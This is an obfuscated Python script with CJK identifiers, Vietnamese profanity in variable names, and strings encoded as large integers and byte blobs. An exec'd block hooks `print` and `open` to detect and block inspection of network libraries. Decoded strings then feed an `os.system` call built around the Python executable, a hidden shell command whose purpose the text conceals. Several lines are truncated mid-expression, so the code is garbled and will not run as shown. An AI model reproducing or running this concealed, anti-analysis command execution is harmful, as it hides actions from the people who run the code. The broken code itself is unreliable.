






try:
    class 燪汼钞嘜嘑飶(eval("Exception")):_ : (lambda :"Tao la dat dep trai")();pass
except Exeption as TUOI_LON_DECODE:pass
else:globals()["dec_dec_cái_đầu_buồi"] = "BỐ ĐẠT"
finally:
    莸誔耶宺櫼茰 = "utf8"
    蘎勇聩乑瀯伮 = globals()
顒鶣茄釷鴛牵 = lambda 顒鶣茄釷鴛牵: 顒鶣茄釷鴛牵[(lambda : -1)()]
def 雘訡衋筿仺癖(雬噙鼨龮弅欇):
    澃溊穟亞膐殛 = ""
    for 蘎勇聩乑瀯伮['莈喐婎鐕叀草'], 蘎勇聩乑瀯伮['旝蚰謔段搉嘊'] in enumerate(雬噙鼨龮弅欇):
        if 蘎勇聩乑瀯伮['莈喐婎鐕叀草'] > 0:
            澃溊穟亞膐殛 += ""
        澃溊穟亞膐殛 += str(蘎勇聩乑瀯伮['旝蚰謔段搉嘊'])
    return 澃溊穟亞膐殛
迾渹煈煖冯戢 = vars(globals()['__builtins__'])
禖虤鵅澗毈闤 = eval
沢鐞莐揦欯俬 = bool
暽掇財豥硿淳 = str
窇楨艓墲伥癴 = type
睵堜仌姰蟸崟 = int
嗜璙袏贆庙聝 = bytes
靡猱黂醅燉钛 = vars
羵袇淧釶砞臔 = callable
濼颤鳴鼂錙讟 = list
疤啥瘈箚楧忶 = map
襺糰蚩瘢倓槓 = len
玂苩觴独閷卯 = bytearray
萻篤抓粯瀊湧 = len
tryᅠ = print
exceptᅠ = input
def 雘訡衋筿仺癖(澃溊穟亞膐殛,*k):
    if k:
        晏擸廢螠杏漂 = '+'
        op = "+"
    else:
        晏擸廢螠杏漂 = ''
        op = ''
    蘎勇聩乑瀯伮['澃溊穟亞膐殛'] = (lambda: (lambda 罞酹媻蔥锻桤: 罞酹媻蔥锻桤 + (lambda : 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()
    蘎勇聩乑瀯伮['雘訡衋筿仺癖'] = 雘訡衋筿仺癖
    蘎勇聩乑瀯伮['暽掇財豥硿淳'] = 暽掇財豥硿淳
    蘎勇聩乑瀯伮['澃溊穟亞膐殛'] = 澃溊穟亞膐殛
    for 蘎勇聩乑瀯伮['晏擸廢螠杏漂_'] in 蘎勇聩乑瀯伮['澃溊穟亞膐殛']:
        if not 澃溊穟亞膐殛:蘎勇聩乑瀯伮['晏擸廢螠杏漂_'] += (lambda : '')()
        晏擸廢螠杏漂 += 暽掇財豥硿淳(晏擸廢螠杏漂_)
    return 晏擸廢螠杏漂
def 趄诖狗谦頠鮳(雬噙鼨龮弅欇):
    return 睵堜仌姰蟸崟(雬噙鼨龮弅欇-0xFFFFFFFFFFFFFFFFFFFFFF)
def 樥庆灾讫薝鯴(雬噙鼨龮弅欇):
    澃溊穟亞膐殛 = 玂苩觴独閷卯(雬噙鼨龮弅欇[萻篤抓粯瀊湧(b'0xFFFFFFFF/'):])
    旝蚰謔段搉嘊 = 0
    for 莈喐婎鐕叀草 in 澃溊穟亞膐殛:
        旝蚰謔段搉嘊 = 旝蚰謔段搉嘊 * 256 + 莈喐婎鐕叀草
    return 旝蚰謔段搉嘊
def 躹鐗渃菧驛倕(闎聝滗巌俛鲤):
    闎聝滗巌俛鲤 = 闎聝滗巌俛鲤-3333333333333333333333333333333333333333333333333333333333242422222222222222222722222233  
    if 闎聝滗巌俛鲤 <= 0x7F:
                return 暽掇財豥硿淳(嗜璙袏贆庙聝([闎聝滗巌俛鲤]),莸誔耶宺櫼茰)
    elif 闎聝滗巌俛鲤 <= 0x7FF:
                if 1<2:
                        蘎勇聩乑瀯伮['旝蚰謔段搉嘊'] = 0xC0 | (闎聝滗巌俛鲤 >> 6)
                蘎勇聩乑瀯伮['莈喐婎鐕叀草'] = 0x80 | (闎聝滗巌俛鲤 & 0x3F)
                return 暽掇財豥硿淳(嗜璙袏贆庙聝([蘎勇聩乑瀯伮['旝蚰謔段搉嘊'], 蘎勇聩乑瀯伮['莈喐婎鐕叀草']]),莸誔耶宺櫼茰)
    elif 闎聝滗巌俛鲤 <= 0xFFFF:
            蘎勇聩乑瀯伮['旝蚰謔段搉嘊'] = 0xE0 | (闎聝滗巌俛鲤 >> 12)
            if 2>1:
                蘎勇聩乑瀯伮['莈喐婎鐕叀草'] = 0x80 | ((闎聝滗巌俛鲤 >> 6) & 0x3F)
            蘎勇聩乑瀯伮['雬噙鼨龮弅欇'] = 0x80 | (闎聝滗巌俛鲤 & 0x3F)
            return 暽掇財豥硿淳(嗜璙袏贆庙聝([蘎勇聩乑瀯伮['旝蚰謔段搉嘊'], 蘎勇聩乑瀯伮['莈喐婎鐕叀草'], 蘎勇聩乑瀯伮['雬噙鼨龮弅欇']]),莸誔耶宺櫼茰)
    else:
        蘎勇聩乑瀯伮['旝蚰謔段搉嘊'] = 0xF0 | (闎聝滗巌俛鲤 >> 18)
        if 2==2:
            蘎勇聩乑瀯伮['莈喐婎鐕叀草'] = 0x80 | ((闎聝滗巌俛鲤 >> 12) & 0x3F)
        if 1<2<3:
            蘎勇聩乑瀯伮['雬噙鼨龮弅欇'] = 0x80 | ((闎聝滗巌俛鲤 >> 6) & 0x3F)
        蘎勇聩乑瀯伮['盐磬唵桐隱梗'] = 0x80 | (闎聝滗巌俛鲤 & 0x3F)
        return 暽掇財豥硿淳(嗜璙袏贆庙聝([蘎勇聩乑瀯伮['旝蚰謔段搉嘊'], 蘎勇聩乑瀯伮['莈喐婎鐕叀草'], 蘎勇聩乑瀯伮['雬噙鼨龮弅欇'], 蘎勇聩乑瀯伮['盐磬唵桐隱梗']]),莸誔耶宺櫼茰)
        


try:
    match '覒鸐谘頍懓宜' == '乂厢捧栺绝六':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            挚诩趫你笟谴 = [[True], [False]]
            暽掇財豥硿淳(['魢踛靆鵈塽狴'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 羬爞广嵆袴嚕:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                甚嘄棝憲钗橙 = [[(lambda: (lambda 蹖腁蕘眘訜溩: 蹖腁蕘眘訜溩 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 犯啻桟栂乑桶: 犯啻桟栂乑桶 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 剒錶撱棠搬吅:
        exec(b'\nlist_func = [\'print\', \'open\']\nhooked_funcs = {}\ninspect = __import__(\'inspect\')\ndef hook_noi(func_name, *args, **kwargs):\n    checked_paths = set()\n    for frame in inspect.stack():\n        filename = frame.filename\n        if filename not in checked_paths:\n            checked_paths.add(filename)\n            try:\n                module_names = [\'requests\', \'pystyle\', \'ssl\', \'socket\', \'inspect\', \'urllib\']\n                for module_name in module_names:\n                    try:\n                        if "requests" in module_name:\n                            requests_path = __import__(\'os\').path.dirname(__import__(\'os\').path.abspath(__import__(\'requests\').__file__))\n                            api_path = __import__(\'os\').path.join(requests_path, \'api.py\')\n                            if api_path in frame.filename:\n                                try:__import__(\'sys\').exit(f"L\xe1\xbb\x97i , H\xc3\xa3y C\xc3\xa0i L\xe1\xba\xa1i Th\xc6\xb0 Vi\xe1\xbb\x87n Requests")\n                                except:pass\n                                finally:__import__(\'sys\').exit(f"L\xe1\xbb\x97i , H\xc3\xa3y C\xc3\xa0i L\xe1\xba\xa1i Th\xc6\xb0 Vi\xe1\xbb\x87n Requests")\n                        module_path = __import__(\'os\').path.abspath(__import__(module_name).__file__)\n                        if module_path in filename:\n                            try:__import__(\'sys\').exit(f"L\xe1\xbb\x97i , H\xc3\xa3y C\xc3\xa0i L\xe1\xba\xa1i Th\xc6\xb0 Vi\xe1\xbb\x87n {api_path}")\n                            except:pass\n                            finally:__import__(\'sys\').exit(f"L\xe1\xbb\x97i , H\xc3\xa3y C\xc3\xa0i L\xe1\xba\xa1i Th\xc6\xb0 Vi\xe1\xbb\x87n {api_path}")\n                    except (ImportError, AttributeError,ModuleNotFoundError):\n                        continue\n            except Exception:\n                pass\n    hooked_funcs[func_name](*args, **kwargs)\ndef hook_check():\n    for func_name in list_func:\n        try:\n            func = getattr(__builtins__, func_name)\n            hooked_funcs[func_name] = func\n            setattr(__builtins__, func_name, lambda *args, func_name=func_name, **kwargs: hook_noi(func_name, *args, **kwargs))\n        except AttributeError:\n            print(f"Warning: {{func_name}} not found in __builtins__")\ndef unhook():\n    for func_name, original_func in hooked_funcs.items():\n        setattr(__builtins__, func_name, original_func)\n    hooked_funcs.clear()\nhook_check()\nimport inspect\nunhook()\n')
try:
    match '锡虵痣栟岷籜' == '当碬鍙隴维鸻':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            醋蠁帲牦仙喬 = [[True], [False]]
            暽掇財豥硿淳(['沴镔金烤捃郄'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 謻賄铦罡鳰繽:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                牛柈赇遭姆韫 = [[(lambda: (lambda 阕钾磌夊檿试: 阕钾磌夊檿试 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蕋翳笊熁尥攙: 蕋翳笊熁尥攙 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 督處遻塹婑交:
        try:
            襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())())
        except:
            襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).system((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())().format(襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).executable))
            襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())())
try:
    match '涢怅珮坪葻真' == '煝狀晚妥荳滝':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            栟餤鍯霥迖岌 = [[True], [False]]
            暽掇財豥硿淳(['竟桻奋鳿扛沞'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 搳媨燆轄犞层:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722244374, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722260525, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722253563, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722255208, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722247834, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722248617]))))())())():
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                興礣櫀徖璅穩 = [[(lambda: (lambda 琂摨省謎瘡唨: 琂摨省謎瘡唨 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 优硭龂堼軞笠: 优硭龂堼軞笠 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 酻呝銃薣苯緭:
        try:
            襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())())
            襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())())
